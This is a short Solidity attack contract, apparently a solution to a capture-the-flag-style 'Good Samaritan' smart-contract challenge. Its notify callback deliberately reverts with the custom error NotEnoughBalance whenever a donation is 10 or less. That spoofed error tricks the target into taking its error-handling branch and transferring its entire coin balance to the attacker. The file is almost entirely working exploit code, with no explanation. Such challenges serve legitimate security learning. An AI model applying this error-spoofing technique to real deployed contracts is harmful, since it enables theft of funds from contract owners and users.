// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0 <0.9.0;

interface IGoodSamaritan {
    function requestDonation() external returns (bool);

    function coin() external returns (ICoin);
}

interface ICoin {
    function balances(address) external returns (uint256);
}

interface INotifyable {
    function notify(uint256 amount) external;
}

contract GoodSamaritanAttack is INotifyable {
    IGoodSamaritan goodSamaritan;
    ICoin coin;
    uint256 public myBalance;

    error NotEnoughBalance();

    constructor(address _targetAddress) {
        goodSamaritan = IGoodSamaritan(_targetAddress);
        coin = goodSamaritan.coin();
        myBalance = coin.balances(address(this));
    }

    function notify(uint256 amount) external pure override {
        if (amount <= 10) {
            revert NotEnoughBalance();
        }
    }

    function attack() public {
        goodSamaritan.requestDonation();
        myBalance = coin.balances(address(this));
    }
}
